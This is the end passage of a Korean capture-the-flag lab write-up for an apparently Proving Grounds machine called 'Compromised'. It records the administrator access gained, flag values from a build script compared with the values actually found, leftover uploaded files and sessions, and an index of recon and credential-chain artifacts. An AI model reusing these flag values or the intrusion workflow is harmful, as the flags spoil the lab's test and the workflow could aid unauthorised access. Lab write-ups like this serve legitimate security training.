- 획득 권한 — `compromised\administrator` (`BUILTIN\Administrators`). SYSTEM 승격은 불요 — 플래그 열람에 로컬 관리자로 충분
- 채점 3요건 — 플래그 값·타깃 IP(`ipconfig`)·권한(`whoami /groups`)이 한 명령의 출력에 공존. 이 단계의 증적은 터미널 출력이므로 코드펜스가 담당하고 GUI 스크린샷은 해당 없음

**빌드 스크립트가 못 박은 플래그 값과 실측 값이 다름.** 이벤트 로그에서 회수한 빌드 스크립트는 아래처럼 고정 값을 심으나, 두 값 모두 실제 인스턴스의 플래그와 불일치.

```powershell
Set-Content -path "C:\Users\Administrator\Desktop\proof.txt" "C2E7EA127C0445D64E2123D223E77545"
Set-Content -path "C:\Users\$user\Desktop\local.txt" "216E3F48A242732F9ECE14CBC76A9334"
```
— 출처: `~/PG/Compromised/build-script-from-eventlog.txt`

| 플래그 | 빌드 스크립트 값 | 실측 값 |
|---|---|---|
| `local.txt` | `216E3F48A242732F9ECE14CBC76A9334` | `3c1acd15f6e0489621429cfb29c1fa9a` |
| `proof.txt` | `C2E7EA127C0445D64E2123D223E77545` | `bc8d255a2e4a76fd9182e6dd86a8f8db` |

플래그가 인스턴스 기동마다 재생성된다는 사실이 대상 내부 기록으로 직접 확인된 사례. **로그·빌드 산출물에서 발견한 플래그 형태의 문자열을 그대로 제출하지 말 것** — 원위치 `type` 결과만 유효.

**남긴 흔적** — 되돌리지 않은 변경. 랩 인스턴스는 정지 시 파괴되나 실 평가에서 같은 누락은 계약 위반.

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | `C:\Users\scripting\Documents\h.ps1` | 열거 스크립트 | 잔존 |
| 업로드 파일 | `C:\Users\Administrator\Documents\h.ps1` | 열거 스크립트 | 잔존 |
| 업로드 파일 | `C:\Users\scripting\Documents\C:UsersscriptingDocumentsh.ps1` | 업로드 경로 오타로 생성된 파일. evil-winrm `upload` 에 절대경로를 주면 백슬래시가 소실돼 경로 문자열 전체가 파일명으로 전락 | 잔존 |
| 업로드 파일 | `C:\Users\scripting\AppData\Local\Temp\harvest_COMPROMISED.txt` | 열거 결과 | 잔존 |
| 업로드 파일 | `C:\Users\Administrator\AppData\Local\Temp\harvest_COMPROMISED.txt` | 열거 결과 | 잔존 |
| 세션 | WinRM Runspace | 끊긴 disconnected 세션. PSWA 로그인 화면에 목록으로 노출 | 잔존 |

- 계정·설정·자격증명 변경 부재. 비밀번호 회전·그룹 추가·서비스 설정 변경 모두 해당 없음
- 이 세션의 Kali tun0 — `192.168.45.247` (출처: `~/PG/Compromised/recon-preflight.txt`). 리버스셸·리스너 미사용이라 LHOST 해당 없음

## 관련

- evil-winrm — https://github.com/Hackplayers/evil-winrm
- NetExec — https://github.com/Pennyw0rth/NetExec
- PowerShell Web Access 배포 문서 — https://learn.microsoft.com/en-us/powershell/module/pswawebapplication/install-pswawebapplication
- 산출물 — `~/PG/Compromised/`
  - 정찰 — `nmap_allports_quick.log`·`nmap_sv.log`·`nmap-full.txt`·`nmap-udp-top100.txt`·`_SUMMARY.txt`
  - SMB — `smb_enum.txt`·`smb_shares_anon.txt`·`smb_users_dirs.txt`·`loot_scripts/`·`loot_users/`
  - 자격증명 체인 — `profile_ps1_scripting.ps1`·`creds_password.txt`·`enc_blob.txt`·`enc_decoded.txt`·`dec.py`·`adminpass.txt`
  - 권한상승 — `log_pshell_op_hits.txt`·`log_winps_hostapp.txt`·`build-script-from-eventlog.txt`
  - 열거 — `enum_whoami.txt`·`enum_logs2.txt`·`harvest_scripting.txt`·`harvest_admin.txt`
  - 플래그 — `proof_user.txt`·`proof_root.txt`
- 원문 미보존 항목 — SMB 파일 회수 명령 · 이벤트 로그 추출 명령 · evil-winrm 접속 명령. 각 산출 결과는 위 경로에 보존
- [[Butch]] — WinRM 대화형 셸(`tech/exec/winrm`)로 플래그 회수
- **"익명 SMB 열거에서 자동 도구가 침묵한다"** 패턴 — 이 노트(`smbclient -L` 만 공유 목록 반환), [[_PLAYBOOK]]
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
